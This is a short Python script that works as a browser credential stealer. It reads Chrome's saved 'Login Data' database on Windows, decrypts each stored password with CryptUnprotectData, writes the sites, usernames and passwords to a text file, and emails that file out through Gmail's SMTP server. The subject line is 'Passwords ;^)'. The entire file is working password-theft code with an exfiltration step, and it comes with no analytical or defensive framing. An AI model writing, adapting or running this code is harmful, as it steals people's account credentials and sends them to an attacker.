from os import getenv
import sqlite3
import win32crypt

import sys
f = open("passwords.txt", "w")

# Connect to the Database
conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
cursor = conn.cursor()
# Get the results
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for result in cursor.fetchall():
  # Decrypt the Password
    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
    if password:

        print >>f,  'Site: ' + result[0]
        print >>f,  'Username: ' + result[1]
        print >>f,  'Password: ' + password

f.close()

#Note: End of password decrypting

#Note: Start emailing

import smtplib
import mimetypes
from email.mime.multipart import MIMEMultipart
from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
import os

#Note: Your Email Account
emailfrom = "youremail"
emailto = "youremail"
fileToSend = "passwords.txt"      
user = "youremail"
password = "pass"

#Note: Email Subject Ect.

msg = MIMEMultipart()
msg["From"] = emailfrom
msg["To"] = emailto
msg["Subject"] = "Passwords ;^)"
msg.preamble = "Passwords yay! :)"

ctype, encoding = mimetypes.guess_type(fileToSend)
if ctype is None or encoding is not None:
    ctype = "application/octet-stream"

maintype, subtype = ctype.split("/", 1)

if maintype == "text":
    fp = open(fileToSend)
    # Note: we should handle calculating the charset
    attachment = MIMEText(fp.read(), _subtype=subtype)
    fp.close()
elif maintype == "image":
    fp = open(fileToSend, "rb")
    attachment = MIMEImage(fp.read(), _subtype=subtype)
    fp.close()

elif maintype == "audio":
    fp = open(fileToSend, "rb")
    attachment = MIMEAudio(fp.read(), _subtype=subtype)
    fp.close()
else:
    fp = open(fileToSend, "rb")
    attachment = MIMEBase(maintype, subtype)
    attachment.set_payload(fp.read())
    fp.close()
    encoders.encode_base64(attachment)
attachment.add_header("Content-Disposition", "attachment", filename=fileToSend)
msg.attach(attachment)

server = smtplib.SMTP("smtp.gmail.com:587")
server.starttls()
server.login(user,password)
server.sendmail(emailfrom, emailto, msg.as_string())
server.quit()

print ("Completed Process")
